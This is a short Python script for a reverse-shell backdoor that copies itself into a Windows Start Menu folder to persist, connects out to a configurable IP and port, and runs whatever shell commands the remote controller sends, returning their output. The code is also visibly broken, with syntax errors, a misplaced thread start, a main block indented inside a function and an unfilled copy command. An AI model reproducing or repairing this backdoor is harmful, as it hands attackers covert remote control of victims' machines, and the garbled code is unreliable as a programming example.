import socket
import subprocess
import threading
import time
import os 

IP = ""
CPORT = 1000


def autorun():
    file = os.path.basename(__file__)
    exe_file = file.replace(".py" , ".exe")
    #print("exe_file")
    os.system("copy {} C:\\Users\Default\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\System Tools\\Executar")

def conn(IP , CPORT):
    try:
        client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)]
        client.connect((IP , CPORT))
        return client
    except Exception as error:
        print(error)


def cmd(client , data):
    try:
        proc = subprocess.Popen(data, shell=True , stdin=subprocess.PIPE, stderr= subprocess)
        output = proc.stdout.read() + proc.stderr.read()
        client.send(output + b "\n")

    except Exception as error:
        print(error)


def cli(client):
    try:
        while True:
            data = client.recv(1024).decode().strip()
            if data == "/:kill":
                return
            else:
                threading.Thread(target=cmd, args=(client, data).start())
    except Exception as error:
        client.close()

    if __name__ == "__main__":
        autorun()
        while True:
            client = conn(IP , CPORT)
            if client:
                cli(client)
            else:
                time.sleep()
           